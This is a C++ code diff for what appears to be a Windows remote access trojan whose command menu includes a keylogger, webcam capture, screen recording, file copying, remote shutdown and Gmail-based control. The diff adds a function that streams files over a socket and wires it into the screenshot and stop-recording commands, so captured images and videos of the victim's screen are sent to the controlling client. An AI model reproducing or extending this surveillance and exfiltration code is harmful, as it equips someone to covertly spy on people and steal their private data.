@@ -146,6 +146,75 @@ void sendResponse(SOCKET sock, const std::string& msg)
     }
 }
 
+bool sendFileToClient(SOCKET sock, const std::string& filePath)
+{
+    if (sock == INVALID_SOCKET)
+    {
+        return false;
+    }
+
+    std::ifstream file(filePath, std::ios::binary);
+    if (!file.is_open())
+    {
+        std::cerr << "Failed to open file: " << filePath << std::endl;
+        return false;
+    }
+
+    // Get filename from path
+    std::string filename = filePath.substr(filePath.find_last_of("/\\") + 1);
+    
+    // Send filename length
+    uint32_t nameLen = filename.size();
+    if (send(sock, reinterpret_cast<const char*>(&nameLen), sizeof(nameLen), 0) == SOCKET_ERROR)
+    {
+        std::cerr << "Failed to send filename length: " << WSAGetLastError() << std::endl;
+        file.close();
+        return false;
+    }
+    
+    // Send filename
+    if (send(sock, filename.c_str(), nameLen, 0) == SOCKET_ERROR)
+    {
+        std::cerr << "Failed to send filename: " << WSAGetLastError() << std::endl;
+        file.close();
+        return false;
+    }
+
+    // Get file size
+    file.seekg(0, std::ios::end);
+    uint32_t fileSize = static_cast<uint32_t>(file.tellg());
+    file.seekg(0, std::ios::beg);
+
+    // Send file size
+    if (send(sock, reinterpret_cast<const char*>(&fileSize), sizeof(fileSize), 0) == SOCKET_ERROR)
+    {
+        std::cerr << "Failed to send file size: " << WSAGetLastError() << std::endl;
+        file.close();
+        return false;
+    }
+
+    // Send file content in chunks
+    char buffer[4096];
+    while (!file.eof())
+    {
+        file.read(buffer, sizeof(buffer));
+        std::streamsize bytesRead = file.gcount();
+        if (bytesRead > 0)
+        {
+            if (send(sock, buffer, static_cast<int>(bytesRead), 0) == SOCKET_ERROR)
+            {
+                std::cerr << "Failed to send file content: " << WSAGetLastError() << std::endl;
+                file.close();
+                return false;
+            }
+        }
+    }
+    
+    file.close();
+    std::cout << "File sent successfully to client: " << filePath << std::endl;
+    return true;
+}
+
 void handleCommand(SOCKET sock, const std::string& cmd)
 {
     if (cmd == "help")
@@ -160,12 +229,12 @@ void handleCommand(SOCKET sock, const std::string& cmd)
             "  copyfile <source>       - Copy file from source to current directory\n"
             "  start_keylogger         - Start keylogger\n"
             "  stop_keylogger          - Stop keylogger\n"
-            "  screenshot              - Capture screen and save as PNG\n"
+            "  screenshot              - Capture screen, save as PNG and send to client\n"
             "  webcam_photo            - Capture single webcam photo\n"
             "  restart                 - Restart the system\n"
             "  shutdown                - Shutdown the system\n"
             "  start_record            - Start screen recording\n"
-            "  stop_record             - Stop screen recording\n"
+            "  stop_record             - Stop screen recording and send file to client\n"
             "  gmail_control           - Control by Gmail\n"
             "  exit                    - Disconnect from server\n";
         sendResponse(sock, helpMsg);
@@ -228,10 +297,27 @@ void handleCommand(SOCKET sock, const std::string& cmd)
         std::string filename = "screenshot.png"; // Default filename
         
         bool success = captureScreen(filename);
-        std::string msg = success ? 
-            "Screenshot captured successfully: " + filename : 
-            "Failed to capture screenshot.";
-        sendResponse(sock, msg);
+        if (success)
+        {
+            std::string msg = "Screenshot captured successfully: " + filename;
+            sendResponse(sock, msg);
+            
+            // Send the screenshot file to client
+            if (sendFileToClient(sock, filename))
+            {
+                std::cout << "Screenshot file sent to client." << std::endl;
+            }
+            else
+            {
+                std::string errorMsg = "Failed to send screenshot file to client.";
+                sendResponse(sock, errorMsg);
+            }
+        }
+        else
+        {
+            std::string msg = "Failed to capture screenshot.";
+            sendResponse(sock, msg);
+        }
     }
     else if (cmd == "restart")
     {
@@ -290,8 +376,20 @@ void handleCommand(SOCKET sock, const std::string& cmd)
         if (isRecording())
         {
             stopScreenRecording();
+            std::string filename = "screen_recording.avi";
             std::string msg = "Screen recording stopped.";
             sendResponse(sock, msg);
+            
+            // Send the recording file to client
+            if (sendFileToClient(sock, filename))
+            {
+                std::cout << "Recording file sent to client." << std::endl;
+            }
+            else
+            {
+                std::string errorMsg = "Failed to send recording file to client.";
+                sendResponse(sock, errorMsg);
+            }
         }
         else
         {
